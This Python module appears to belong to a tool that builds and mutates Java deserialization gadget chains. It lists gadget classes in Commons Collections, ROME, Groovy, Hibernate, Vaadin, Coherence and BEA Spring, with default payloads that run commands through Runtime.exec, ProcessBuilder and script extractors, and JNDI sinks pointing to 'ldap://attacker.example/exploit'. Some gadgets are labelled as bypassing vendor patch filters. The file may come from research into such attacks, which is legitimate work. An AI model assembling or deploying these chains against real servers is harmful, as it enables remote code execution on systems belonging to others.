"""IOCD-lite: Field constraint database for Java deserialization gadget chains.

Models dataflow dependencies between injection object fields (inspired by
JDD's Injection Object Construction Diagram).  When a type_swap or
subclass_swap mutation changes a link's class, cascade_from_swap() fixes
dependent fields so the chain remains structurally valid.

Constraint types:
  ref_type      — field must be a $ref to a link whose class implements iface
  nullable_ref  — like ref_type but may be null
  string_enum   — field must be one of the listed string values
  class_name    — field value must be a FQCN from TYPE_HIERARCHY
  literal       — field is a fixed constant (don't mutate)
  array_refs    — field must be an array of $ref pointers
  nullable      — field can be null (informational)
"""

from __future__ import annotations

import copy
import logging
import random
from dataclasses import dataclass
from typing import Any

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Constraint definitions
# ---------------------------------------------------------------------------

@dataclass(frozen=True, slots=True)
class FieldContract:
    field: str
    ctype: str          # ref_type | nullable_ref | string_enum | class_name | literal | array_refs | nullable
    allowed: Any = None  # interface name, list of strings, or literal value


# Bean properties used by BeanComparator / ColumnComparator / Vaadin
BEAN_PROPERTIES: list[str] = [
    "outputProperties", "databaseMetaData", "connection", "class",
    "object", "content", "loaderInfo",
]

# Dangerous method names used by InvokerTransformer / EventHandler
DANGEROUS_METHODS: list[str] = [
    "exec", "start", "invoke", "lookup", "doLookup", "eval",
    "loadClass", "defineClass", "newInstance", "forName",
    "getRuntime", "getMethod", "getDeclaredMethod",
    "getOutputProperties", "getDatabaseMetaData",
    "execute", "toString", "hashCode", "getValue",
]

JNDI_URLS: list[str] = [
    "ldap://attacker.example/exploit",
    "rmi://attacker.example/exploit",
    "dns://attacker.example",
]

SINK_CLASSES: list[str] = [
    "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
    "com.sun.rowset.JdbcRowSetImpl",
]


# ---------------------------------------------------------------------------
# Per-class field contracts
# ---------------------------------------------------------------------------

FIELD_CONTRACTS: dict[str, list[FieldContract]] = {
    # ── CC3 Transformers ──
    "org.apache.commons.collections.functors.InvokerTransformer": [
        FieldContract("iMethodName", "string_enum", DANGEROUS_METHODS),
        FieldContract("iParamTypes", "literal", None),
        FieldContract("iArgs", "literal", None),
    ],
    "org.apache.commons.collections.functors.ChainedTransformer": [
        FieldContract("iTransformers", "array_refs", "org.apache.commons.collections.Transformer"),
    ],
    "org.apache.commons.collections.functors.ConstantTransformer": [
        FieldContract("iConstant", "class_name", None),
    ],
    "org.apache.commons.collections.functors.InstantiateTransformer": [
        FieldContract("iParamTypes", "literal", None),
        FieldContract("iArgs", "literal", None),
    ],
    "org.apache.commons.collections.functors.MapTransformer": [
        FieldContract("iMap", "ref_type", "java.util.Map"),
    ],

    # ── CC4 Transformers ──
    "org.apache.commons.collections4.functors.InvokerTransformer": [
        FieldContract("iMethodName", "string_enum", DANGEROUS_METHODS),
        FieldContract("iParamTypes", "literal", None),
        FieldContract("iArgs", "literal", None),
    ],
    "org.apache.commons.collections4.functors.ChainedTransformer": [
        FieldContract("iTransformers", "array_refs", "org.apache.commons.collections4.Transformer"),
    ],
    "org.apache.commons.collections4.functors.ConstantTransformer": [
        FieldContract("iConstant", "class_name", None),
    ],
    "org.apache.commons.collections4.functors.InstantiateTransformer": [
        FieldContract("iParamTypes", "literal", None),
        FieldContract("iArgs", "literal", None),
    ],

    # ── Comparators ──
    "org.apache.commons.collections4.comparators.TransformingComparator": [
        FieldContract("transformer", "ref_type", "org.apache.commons.collections4.Transformer"),
    ],
    "org.apache.commons.beanutils.BeanComparator": [
        FieldContract("property", "string_enum", BEAN_PROPERTIES),
        FieldContract("comparator", "nullable_ref", "java.util.Comparator"),
    ],
    "org.apache.click.control.Column$ColumnComparator": [
        FieldContract("column", "literal", None),  # nested {"name": property}
    ],

    # ── Map gadgets ──
    "org.apache.commons.collections.map.LazyMap": [
        FieldContract("factory", "ref_type", "org.apache.commons.collections.Transformer"),
        FieldContract("map", "nullable_ref", "java.util.Map"),
    ],
    "org.apache.commons.collections4.map.LazyMap": [
        FieldContract("factory", "ref_type", "org.apache.commons.collections4.Transformer"),
        FieldContract("map", "nullable_ref", "java.util.Map"),
    ],
    "org.apache.commons.collections.map.TransformedMap": [
        FieldContract("keyTransformer", "nullable_ref", "org.apache.commons.collections.Transformer"),
        FieldContract("valueTransformer", "ref_type", "org.apache.commons.collections.Transformer"),
        FieldContract("map", "nullable_ref", "java.util.Map"),
    ],

    # ── TiedMapEntry (key/value extraction) ──
    "org.apache.commons.collections.keyvalue.TiedMapEntry": [
        FieldContract("map", "ref_type", "java.util.Map"),
        FieldContract("key", "literal", None),
    ],
    "org.apache.commons.collections4.keyvalue.TiedMapEntry": [
        FieldContract("map", "ref_type", "java.util.Map"),
        FieldContract("key", "literal", None),
    ],

    # ── InvocationHandler / Proxy ──
    "java.beans.EventHandler": [
        FieldContract("target", "ref_type", None),  # any object
        FieldContract("action", "string_enum", DANGEROUS_METHODS),
    ],
    "bsh.XThis$Handler": [
        FieldContract("target", "ref_type", None),
        FieldContract("action", "string_enum", ["compare", "equals", "hashCode", "toString"]),
    ],

    # ── ROME ──
    "com.sun.syndication.feed.impl.ToStringBean": [
        FieldContract("_beanClass", "class_name", SINK_CLASSES),
        FieldContract("_obj", "ref_type", None),
    ],
    "com.sun.syndication.feed.impl.ObjectBean": [
        FieldContract("_equalsBean", "nullable_ref", None),
        FieldContract("_toStringBean", "ref_type", None),
        FieldContract("_cloneableBean", "nullable", None),
    ],
    "com.sun.syndication.feed.impl.EqualsBean": [
        FieldContract("_beanClass", "class_name", None),
        FieldContract("_obj", "ref_type", None),
    ],

    # ── Groovy ──
    "org.codehaus.groovy.runtime.GStringImpl": [
        FieldContract("values", "array_refs", None),
        FieldContract("strings", "literal", None),
    ],
    "org.codehaus.groovy.runtime.MethodClosure": [
        FieldContract("owner", "literal", None),
        FieldContract("delegate", "literal", None),
        FieldContract("method", "string_enum", ["execute", "exec", "start", "run"]),
        FieldContract("maximumNumberOfParameters", "literal", 0),
        FieldContract("parameterTypes", "literal", []),
    ],

    # ── Hibernate ──
    "org.hibernate.engine.spi.TypedValue": [
        FieldContract("type", "ref_type", "org.hibernate.type.Type"),
        FieldContract("value", "ref_type", None),
    ],
    "org.hibernate.type.ComponentType": [
        FieldContract("propertyTypes", "array_refs", "org.hibernate.type.Type"),
        FieldContract("propertySpan", "literal", None),
    ],
    "org.hibernate.property.access.spi.GetterMethodImpl": [
        FieldContract("containerClass", "class_name", SINK_CLASSES),
        FieldContract("propertyName", "string_enum", BEAN_PROPERTIES),
    ],

    # ── Vaadin ──
    "com.vaadin.data.util.MethodProperty": [
        FieldContract("instance", "ref_type", None),
        FieldContract("getMethodName", "string_enum", ["getOutputProperties", "getDatabaseMetaData", "getConnection"]),
        FieldContract("setMethodName", "nullable", None),
        FieldContract("type", "class_name", None),
    ],
    "com.vaadin.data.util.NestedMethodProperty": [
        FieldContract("instance", "ref_type", None),
        FieldContract("propertyName", "string_enum", BEAN_PROPERTIES),
    ],

    # ── JNDI sink ──
    "com.sun.rowset.JdbcRowSetImpl": [
        FieldContract("dataSource", "string_enum", JNDI_URLS),
    ],

    # ── TemplatesImpl sink ──
    "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl": [
        FieldContract("_name", "literal", "exploit"),
        FieldContract("_class", "nullable", None),
        FieldContract("_bytecodes", "nullable", None),
    ],
    # ── WildFly shaded TemplatesImpl (JPMS bypass) ──
    "org.eclipse.tags.shaded.org.apache.xalan.xsltc.trax.TemplatesImpl": [
        FieldContract("_name", "literal", "exploit"),
        FieldContract("_class", "nullable", None),
        FieldContract("_bytecodes", "nullable", None),
    ],

    # ── BeanShell ──
    "bsh.Interpreter": [
        FieldContract("payload", "literal", None),
    ],

    # ── Coherence ValueExtractor (CVE-2020-2555/2883) ──
    "com.tangosol.util.extractor.ReflectionExtractor": [
        FieldContract("m_sMethod", "string_enum", DANGEROUS_METHODS + ["extract"]),
        FieldContract("m_aoParam", "literal", None),
    ],
    "com.tangosol.util.extractor.ChainedExtractor": [
        FieldContract("m_aExtractor", "array_refs", "com.tangosol.util.ValueExtractor"),
    ],
    "com.tangosol.util.extractor.MultiExtractor": [
        FieldContract("m_aExtractor", "array_refs", "com.tangosol.util.ValueExtractor"),
    ],
    "com.tangosol.util.extractor.UniversalExtractor": [
        FieldContract("m_sName", "string_enum", DANGEROUS_METHODS + BEAN_PROPERTIES),
        FieldContract("m_aoParam", "literal", None),
        FieldContract("m_nTarget", "literal", 0),
    ],
    "com.tangosol.util.extractor.ScriptValueExtractor": [
        FieldContract("m_sLanguage", "string_enum", ["js", "groovy", "python"]),
        FieldContract("m_sScript", "literal", None),
    ],
    "com.tangosol.util.comparator.ExtractorComparator": [
        FieldContract("m_extractor", "ref_type", "com.tangosol.util.ValueExtractor"),
    ],
    "com.tangosol.util.filter.LimitFilter": [
        FieldContract("m_comparator", "nullable_ref", "com.tangosol.util.ValueExtractor"),
        FieldContract("m_oAnchorTop", "class_name", None),
        FieldContract("m_oAnchorBottom", "nullable", None),
    ],

    # ── Post-PSU: Coherence reporter ValueExtractors (pass ClassFilter) ──
    "com.tangosol.coherence.reporter.extractor.AttributeExtractor": [
        FieldContract("m_sName", "string_enum", DANGEROUS_METHODS + BEAN_PROPERTIES),
        FieldContract("m_aoParam", "literal", None),
        FieldContract("m_nTarget", "literal", 0),
    ],
    "com.tangosol.coherence.reporter.extractor.SubQueryExtractor": [
        FieldContract("m_sName", "string_enum", DANGEROUS_METHODS + BEAN_PROPERTIES),
        FieldContract("m_aoParam", "literal", None),
        FieldContract("m_nTarget", "literal", 0),
    ],
    "com.tangosol.coherence.reporter.extractor.KeyExtractor": [
        FieldContract("m_sName", "string_enum", DANGEROUS_METHODS + BEAN_PROPERTIES),
        FieldContract("m_aoParam", "literal", None),
        FieldContract("m_nTarget", "literal", 0),
    ],
    "com.tangosol.coherence.reporter.extractor.ConstantExtractor": [
        FieldContract("m_sName", "string_enum", DANGEROUS_METHODS + BEAN_PROPERTIES),
        FieldContract("m_aoParam", "literal", None),
        FieldContract("m_nTarget", "literal", 0),
    ],
    "com.tangosol.coherence.reporter.extractor.DeltaExtractor": [
        FieldContract("m_sName", "string_enum", DANGEROUS_METHODS + BEAN_PROPERTIES),
        FieldContract("m_aoParam", "literal", None),
        FieldContract("m_nTarget", "literal", 0),
    ],
    "com.tangosol.coherence.reporter.extractor.AggregateExtractor": [
        FieldContract("m_sName", "string_enum", DANGEROUS_METHODS + BEAN_PROPERTIES),
        FieldContract("m_aoParam", "literal", None),
        FieldContract("m_nTarget", "literal", 0),
    ],
    "com.tangosol.coherence.reporter.extractor.OperationExtractor": [
        FieldContract("m_sName", "string_enum", DANGEROUS_METHODS + BEAN_PROPERTIES),
        FieldContract("m_aoParam", "literal", None),
        FieldContract("m_nTarget", "literal", 0),
    ],
    "com.tangosol.coherence.reporter.extractor.CorrelatedExtractor": [
        FieldContract("m_sName", "string_enum", DANGEROUS_METHODS + BEAN_PROPERTIES),
        FieldContract("m_aoParam", "literal", None),
        FieldContract("m_nTarget", "literal", 0),
    ],

    # ── Post-PSU: Coherence comparator wrappers ──
    "com.tangosol.util.comparator.ChainedComparator": [
        FieldContract("m_aComparator", "array_refs", "java.util.Comparator"),
    ],
    "com.tangosol.util.comparator.SafeComparator": [
        FieldContract("m_comparator", "ref_type", "java.util.Comparator"),
    ],
    "com.tangosol.util.comparator.InverseComparator": [
        FieldContract("m_comparator", "ref_type", "java.util.Comparator"),
    ],
    "com.tangosol.util.comparator.EntryComparator": [
        FieldContract("m_comparator", "ref_type", "java.util.Comparator"),
        FieldContract("m_nStyle", "literal", 0),
    ],
    "com.tangosol.coherence.transaction.internal.ComparatorWrapper": [
        FieldContract("m_comparator", "ref_type", "java.util.Comparator"),
    ],

    # ── Post-PSU: BEA Spring comparators ──
    "com.bea.core.repackaged.springframework.util.comparator.CompoundComparator": [
        FieldContract("comparators", "array_refs", "java.util.Comparator"),
    ],
    "com.bea.core.repackaged.springframework.util.comparator.InvertibleComparator": [
        FieldContract("comparator", "ref_type", "java.util.Comparator"),
        FieldContract("ascending", "literal", True),
    ],

    # ── Post-PSU: BEA Spring AOP ──
    "com.bea.core.repackaged.springframework.aop.framework.AdvisedSupport": [
        FieldContract("targetSource", "ref_type", None),
        FieldContract("advisorChainFactory", "nullable_ref", None),
    ],
    "com.bea.core.repackaged.springframework.aop.framework.JdkDynamicAopProxy": [
        FieldContract("advised", "ref_type", None),
    ],
}


# ---------------------------------------------------------------------------
# Default field overrides per class (used when cascade needs to create fields)
# ---------------------------------------------------------------------------

_DEFAULT_OVERRIDES: dict[str, dict[str, Any]] = {
    "org.apache.commons.collections.functors.InvokerTransformer": {
        "iMethodName": "exec",
        "iParamTypes": ["[Ljava.lang.String;"],
        "iArgs": [["id"]],
    },
    "org.apache.commons.collections4.functors.InvokerTransformer": {
        "iMethodName": "exec",
        "iParamTypes": ["[Ljava.lang.String;"],
        "iArgs": [["id"]],
    },
    "org.apache.commons.collections.functors.ConstantTransformer": {
        "iConstant": "java.lang.Runtime",
    },
    "org.apache.commons.collections4.functors.ConstantTransformer": {
        "iConstant": "java.lang.Runtime",
    },
    "org.apache.commons.collections.functors.ChainedTransformer": {
        "iTransformers": [],
    },
    "org.apache.commons.collections4.functors.ChainedTransformer": {
        "iTransformers": [],
    },
    "org.apache.commons.collections4.comparators.TransformingComparator": {
        "transformer": {"$ref": "link:1"},
    },
    "org.apache.commons.beanutils.BeanComparator": {
        "property": "outputProperties",
    },
    "org.apache.commons.collections.map.LazyMap": {
        "map": {},
        "factory": {"$ref": "link:1"},
    },
    "org.apache.commons.collections4.map.LazyMap": {
        "map": {},
        "factory": {"$ref": "link:1"},
    },
    "org.apache.commons.collections.keyvalue.TiedMapEntry": {
        "map": {"$ref": "link:1"},
        "key": "trigger",
    },
    "org.apache.commons.collections4.keyvalue.TiedMapEntry": {
        "map": {"$ref": "link:1"},
        "key": "trigger",
    },
    "com.sun.syndication.feed.impl.ToStringBean": {
        "_beanClass": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
        "_obj": {"$ref": "link:1"},
    },
    "com.sun.syndication.feed.impl.EqualsBean": {
        "_beanClass": "com.sun.syndication.feed.impl.ToStringBean",
        "_obj": {"$ref": "link:1"},
    },
    "com.sun.syndication.feed.impl.ObjectBean": {
        "_equalsBean": {"$ref": "link:0"},
        "_toStringBean": {"$ref": "link:1"},
        "_cloneableBean": None,
    },
    "org.codehaus.groovy.runtime.MethodClosure": {
        "owner": "id",
        "delegate": "id",
        "method": "execute",
        "maximumNumberOfParameters": 0,
        "parameterTypes": [],
    },
    "org.codehaus.groovy.runtime.GStringImpl": {
        "values": [{"$ref": "link:0"}],
        "strings": ["", ""],
    },
    "org.hibernate.engine.spi.TypedValue": {
        "type": {"$ref": "link:1"},
        "value": {"$ref": "link:2"},
    },
    "org.hibernate.type.ComponentType": {
        "propertyTypes": [{"$ref": "link:1"}],
        "propertySpan": 1,
    },
    "org.hibernate.property.access.spi.GetterMethodImpl": {
        "containerClass": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
        "propertyName": "outputProperties",
    },
    "com.vaadin.data.util.MethodProperty": {
        "instance": {"$ref": "link:1"},
        "getMethodName": "getOutputProperties",
        "setMethodName": None,
        "type": "java.util.Properties",
    },
    "com.vaadin.data.util.NestedMethodProperty": {
        "instance": {"$ref": "link:1"},
        "propertyName": "outputProperties",
    },
    "com.sun.rowset.JdbcRowSetImpl": {
        "dataSource": "ldap://attacker.example/exploit",
    },
    "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl": {
        "_name": "exploit",
        "_class": None,
        "_bytecodes": None,
    },
    "org.eclipse.tags.shaded.org.apache.xalan.xsltc.trax.TemplatesImpl": {
        "_name": "exploit",
        "_class": None,
        "_bytecodes": None,
    },
    "java.beans.EventHandler": {
        "target": {"$ref": "link:0"},
        "action": "exec",
    },
    "bsh.XThis$Handler": {
        "target": {"$ref": "link:0"},
        "action": "compare",
    },
    "bsh.Interpreter": {
        "payload": 'compare(Object a, Object b) {new java.lang.ProcessBuilder(new String[]{"id"}).start();return new Integer(1);}',
    },
    # ── Coherence ──
    "com.tangosol.util.extractor.ReflectionExtractor": {
        "m_sMethod": "exec",
        "m_aoParam": ["id"],
    },
    "com.tangosol.util.extractor.ChainedExtractor": {
        "m_aExtractor": [],
    },
    "com.tangosol.util.extractor.MultiExtractor": {
        "m_aExtractor": [],
    },
    "com.tangosol.util.extractor.UniversalExtractor": {
        "m_sName": "getDatabaseMetaData",
        "m_aoParam": [],
        "m_nTarget": 0,
    },
    "com.tangosol.util.extractor.ScriptValueExtractor": {
        "m_sLanguage": "js",
        "m_sScript": "java.lang.Runtime.getRuntime().exec('id')",
    },
    "com.tangosol.util.comparator.ExtractorComparator": {
        "m_extractor": {"$ref": "link:1"},
    },
    "com.tangosol.util.filter.LimitFilter": {
        "m_comparator": {"$ref": "link:1"},
        "m_oAnchorTop": "java.lang.Runtime",
        "m_oAnchorBottom": None,
    },
    # ── Post-PSU: Reporter ValueExtractors ──
    "com.tangosol.coherence.reporter.extractor.AttributeExtractor": {
        "m_sName": "databaseMetaData",
        "m_aoParam": [],
        "m_nTarget": 0,
    },
    "com.tangosol.coherence.reporter.extractor.SubQueryExtractor": {
        "m_sName": "databaseMetaData",
        "m_aoParam": [],
        "m_nTarget": 0,
    },
    "com.tangosol.coherence.reporter.extractor.KeyExtractor": {
        "m_sName": "databaseMetaData",
        "m_aoParam": [],
        "m_nTarget": 0,
    },
    "com.tangosol.coherence.reporter.extractor.ConstantExtractor": {
        "m_sName": "databaseMetaData",
        "m_aoParam": [],
        "m_nTarget": 0,
    },
    "com.tangosol.coherence.reporter.extractor.DeltaExtractor": {
        "m_sName": "databaseMetaData",
        "m_aoParam": [],
        "m_nTarget": 0,
    },
    "com.tangosol.coherence.reporter.extractor.AggregateExtractor": {
        "m_sName": "databaseMetaData",
        "m_aoParam": [],
        "m_nTarget": 0,
    },
    "com.tangosol.coherence.reporter.extractor.OperationExtractor": {
        "m_sName": "databaseMetaData",
        "m_aoParam": [],
        "m_nTarget": 0,
    },
    "com.tangosol.coherence.reporter.extractor.CorrelatedExtractor": {
        "m_sName": "databaseMetaData",
        "m_aoParam": [],
        "m_nTarget": 0,
    },
    # ── Post-PSU: Coherence comparator wrappers ──
    "com.tangosol.util.comparator.ChainedComparator": {
        "m_aComparator": [{"$ref": "link:1"}],
    },
    "com.tangosol.util.comparator.SafeComparator": {
        "m_comparator": {"$ref": "link:1"},
    },
    "com.tangosol.util.comparator.InverseComparator": {
        "m_comparator": {"$ref": "link:1"},
    },
    "com.tangosol.util.comparator.EntryComparator": {
        "m_comparator": {"$ref": "link:1"},
        "m_nStyle": 0,
    },
    "com.tangosol.coherence.transaction.internal.ComparatorWrapper": {
        "m_comparator": {"$ref": "link:1"},
    },
    # ── Post-PSU: BEA Spring comparators ──
    "com.bea.core.repackaged.springframework.util.comparator.CompoundComparator": {
        "comparators": [{"$ref": "link:1"}],
    },
    "com.bea.core.repackaged.springframework.util.comparator.InvertibleComparator": {
        "comparator": {"$ref": "link:1"},
        "ascending": True,
    },
    # ── Post-PSU: BEA Spring AOP ──
    "com.bea.core.repackaged.springframework.aop.framework.AdvisedSupport": {
        "targetSource": {"$ref": "link:1"},
        "advisorChainFactory": None,
    },
    "com.bea.core.repackaged.springframework.aop.framework.JdkDynamicAopProxy": {
        "advised": {"$ref": "link:1"},
    },
}

# Interface compatibility: which interface category does a class belong to?
# Used by cascade to check if a $ref target is compatible after swap.
_INTERFACE_MAP: dict[str, str] = {
    # CC3 Transformers
    "org.apache.commons.collections.functors.InvokerTransformer": "org.apache.commons.collections.Transformer",
    "org.apache.commons.collections.functors.ChainedTransformer": "org.apache.commons.collections.Transformer",
    "org.apache.commons.collections.functors.ConstantTransformer": "org.apache.commons.collections.Transformer",
    "org.apache.commons.collections.functors.InstantiateTransformer": "org.apache.commons.collections.Transformer",
    "org.apache.commons.collections.functors.MapTransformer": "org.apache.commons.collections.Transformer",
    # CC4 Transformers
    "org.apache.commons.collections4.functors.InvokerTransformer": "org.apache.commons.collections4.Transformer",
    "org.apache.commons.collections4.functors.ChainedTransformer": "org.apache.commons.collections4.Transformer",
    "org.apache.commons.collections4.functors.ConstantTransformer": "org.apache.commons.collections4.Transformer",
    "org.apache.commons.collections4.functors.InstantiateTransformer": "org.apache.commons.collections4.Transformer",
    # Comparators
    "org.apache.commons.collections4.comparators.TransformingComparator": "java.util.Comparator",
    "org.apache.commons.beanutils.BeanComparator": "java.util.Comparator",
    "org.apache.click.control.Column$ColumnComparator": "java.util.Comparator",
    # Maps
    "org.apache.commons.collections.map.LazyMap": "java.util.Map",
    "org.apache.commons.collections4.map.LazyMap": "java.util.Map",
    "org.apache.commons.collections.map.TransformedMap": "java.util.Map",
    # ROME
    "com.sun.syndication.feed.impl.ToStringBean": "com.sun.syndication.feed.impl.ToStringBean",
    "com.sun.syndication.feed.impl.ObjectBean": "com.sun.syndication.feed.impl.ObjectBean",
    "com.sun.syndication.feed.impl.EqualsBean": "com.sun.syndication.feed.impl.ObjectBean",
    # Groovy
    "org.codehaus.groovy.runtime.MethodClosure": "groovy.lang.Closure",
    "org.codehaus.groovy.runtime.GStringImpl": "groovy.lang.GString",
    # Hibernate
    "org.hibernate.engine.spi.TypedValue": "org.hibernate.engine.spi.TypedValue",
    "org.hibernate.type.ComponentType": "org.hibernate.type.Type",
    "org.hibernate.property.access.spi.GetterMethodImpl": "org.hibernate.property.access.spi.GetterMethodImpl",
    # Vaadin
    "com.vaadin.data.util.MethodProperty": "com.vaadin.data.Property",
    "com.vaadin.data.util.NestedMethodProperty": "com.vaadin.data.Property",
    # Sinks
    "com.sun.rowset.JdbcRowSetImpl": "javax.sql.rowset.BaseRowSet",
    "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl": "javax.xml.transform.Templates",
    "org.eclipse.tags.shaded.org.apache.xalan.xsltc.trax.TemplatesImpl": "javax.xml.transform.Templates",
    # WildFly alternative triggers
    "org.apache.commons.collections.bag.TreeBag": "org.apache.commons.collections.Bag",
    "org.apache.commons.collections.bidimap.DualTreeBidiMap": "java.util.Map",
    "org.apache.commons.collections.bidimap.DualHashBidiMap": "java.util.Map",
    # Coherence
    "com.tangosol.util.extractor.ReflectionExtractor": "com.tangosol.util.ValueExtractor",
    "com.tangosol.util.extractor.ChainedExtractor": "com.tangosol.util.ValueExtractor",
    "com.tangosol.util.extractor.MultiExtractor": "com.tangosol.util.ValueExtractor",
    "com.tangosol.util.extractor.UniversalExtractor": "com.tangosol.util.ValueExtractor",
    "com.tangosol.util.extractor.ComparisonValueExtractor": "com.tangosol.util.ValueExtractor",
    "com.tangosol.util.extractor.ScriptValueExtractor": "com.tangosol.util.ValueExtractor",
    "com.tangosol.util.comparator.ExtractorComparator": "java.util.Comparator",
    "com.tangosol.util.filter.LimitFilter": "com.tangosol.util.filter.LimitFilter",
    # Post-PSU: reporter extractors
    "com.tangosol.coherence.reporter.extractor.AttributeExtractor": "com.tangosol.util.ValueExtractor",
    "com.tangosol.coherence.reporter.extractor.SubQueryExtractor": "com.tangosol.util.ValueExtractor",
    "com.tangosol.coherence.reporter.extractor.KeyExtractor": "com.tangosol.util.ValueExtractor",
    "com.tangosol.coherence.reporter.extractor.ConstantExtractor": "com.tangosol.util.ValueExtractor",
    "com.tangosol.coherence.reporter.extractor.DeltaExtractor": "com.tangosol.util.ValueExtractor",
    "com.tangosol.coherence.reporter.extractor.AggregateExtractor": "com.tangosol.util.ValueExtractor",
    "com.tangosol.coherence.reporter.extractor.OperationExtractor": "com.tangosol.util.ValueExtractor",
    "com.tangosol.coherence.reporter.extractor.CorrelatedExtractor": "com.tangosol.util.ValueExtractor",
    "com.tangosol.coherence.transaction.internal.ValuesKeyExtractor": "com.tangosol.util.ValueExtractor",
    # Post-PSU: Coherence comparator wrappers
    "com.tangosol.util.comparator.ChainedComparator": "java.util.Comparator",
    "com.tangosol.util.comparator.SafeComparator": "java.util.Comparator",
    "com.tangosol.util.comparator.InverseComparator": "java.util.Comparator",
    "com.tangosol.util.comparator.EntryComparator": "java.util.Comparator",
    "com.tangosol.coherence.transaction.internal.ComparatorWrapper": "java.util.Comparator",
    # Post-PSU: BEA Spring
    "com.bea.core.repackaged.springframework.util.comparator.CompoundComparator": "java.util.Comparator",
    "com.bea.core.repackaged.springframework.util.comparator.InvertibleComparator": "java.util.Comparator",
    "com.bea.core.repackaged.springframework.util.comparator.BooleanComparator": "java.util.Comparator",
    "com.bea.core.repackaged.springframework.aop.framework.AdvisedSupport": "com.bea.core.repackaged.springframework.aop",
    "com.bea.core.repackaged.springframework.aop.framework.JdkDynamicAopProxy": "java.lang.reflect.InvocationHandler",
}


# ---------------------------------------------------------------------------
# Validation
# ---------------------------------------------------------------------------

@dataclass(slots=True)
class Violation:
    link_index: int
    field: str
    constraint_type: str
    detail: str


def validate_link(link: dict[str, Any], link_index: int) -> list[Violation]:
    """Check a link's field_overrides against its class contracts."""
    class_name = link.get("class", "")
    contracts = FIELD_CONTRACTS.get(class_name, [])
    if not contracts:
        return []

    overrides = link.get("field_overrides", {})
    violations: list[Violation] = []

    for c in contracts:
        val = overrides.get(c.field)

        if c.ctype == "ref_type":
            # Must be a $ref dict
            if not isinstance(val, dict) or "$ref" not in val:
                if val is not None:
                    violations.append(Violation(
                        link_index, c.field, "ref_expected",
                        f"expected $ref for {c.allowed or 'any'}, got {type(val).__name__}",
                    ))

        elif c.ctype == "string_enum":
            if isinstance(val, str) and c.allowed and val not in c.allowed:
                violations.append(Violation(
                    link_index, c.field, "invalid_enum",
                    f"'{val}' not in allowed set",
                ))

        elif c.ctype == "class_name":
            if isinstance(val, str) and c.allowed:
                if val not in c.allowed:
                    violations.append(Violation(
                        link_index, c.field, "invalid_class",
                        f"'{val}' not in allowed classes",
                    ))

        elif c.ctype == "array_refs":
            if isinstance(val, list):
                for i, item in enumerate(val):
                    if isinstance(item, dict) and "$ref" not in item:
                        violations.append(Violation(
                            link_index, c.field, "array_ref_expected",
                            f"item[{i}] missing $ref",
                        ))

    return violations


def validate_chain(ir: dict[str, Any]) -> list[Violation]:
    """Validate all links in an IR chain."""
    violations: list[Violation] = []
    for i, link in enumerate(ir.get("links", [])):
        violations.extend(validate_link(link, i))
    return violations


def constraint_score(ir: dict[str, Any]) -> float:
    """Return fraction of satisfied constraints (0.0 to 1.0)."""
    total = 0
    violated = 0
    for i, link in enumerate(ir.get("links", [])):
        class_name = link.get("class", "")
        contracts = FIELD_CONTRACTS.get(class_name, [])
        total += len(contracts)
        violated += len(validate_link(link, i))
    if total == 0:
        return 1.0
    return max(0.0, (total - violated) / total)


# ---------------------------------------------------------------------------
# Fix / Cascade
# ---------------------------------------------------------------------------

def fix_link(link: dict[str, Any], rng: random.Random) -> dict[str, Any]:
    """Auto-repair constraint violations in a single link."""
    class_name = link.get("class", "")
    contracts = FIELD_CONTRACTS.get(class_name, [])
    if not contracts:
        return link

    link = copy.deepcopy(link)
    overrides = link.setdefault("field_overrides", {})

    for c in contracts:
        val = overrides.get(c.field)

        if c.ctype == "string_enum" and c.allowed:
            if not isinstance(val, str) or val not in c.allowed:
                overrides[c.field] = rng.choice(c.allowed)

        elif c.ctype == "class_name" and c.allowed:
            if not isinstance(val, str) or val not in c.allowed:
                overrides[c.field] = rng.choice(c.allowed)

    return link


def cascade_from_swap(
    old_class: str,
    new_class: str,
    link: dict[str, Any],
    chain_links: list[dict[str, Any]],
    link_index: int,
    rng: random.Random,
) -> dict[str, Any]:
    """After swapping a link's class from old_class to new_class,
    fix field_overrides to match the new class's contracts.

    Strategy:
    1. If new_class has default overrides, use those as base
    2. Preserve $ref pointers that are still valid
    3. Fix enum/class_name fields from contracts
    """
    link = copy.deepcopy(link)
    link["class"] = new_class

    old_overrides = link.get("field_overrides", {})
    defaults = _DEFAULT_OVERRIDES.get(new_class, {})

    if defaults:
        # Start from defaults, overlay compatible old overrides
        new_overrides = copy.deepcopy(defaults)

        # Preserve $ref pointers from old overrides if the field exists in new
        for field, val in old_overrides.items():
            if field in new_overrides:
                # Keep old $ref if it's a valid ref
                if isinstance(val, dict) and "$ref" in val:
                    new_overrides[field] = val
            # Don't carry over fields that new class doesn't expect

        link["field_overrides"] = new_overrides
    else:
        # No defaults known — keep old overrides but fix what we can
        pass

    # Final validation pass: fix any remaining violations
    link = fix_link(link, rng)
    return link


def same_interface(class_a: str, class_b: str) -> bool:
    """Check if two classes implement the same interface category."""
    iface_a = _INTERFACE_MAP.get(class_a)
    iface_b = _INTERFACE_MAP.get(class_b)
    if iface_a and iface_b:
        return iface_a == iface_b
    return False
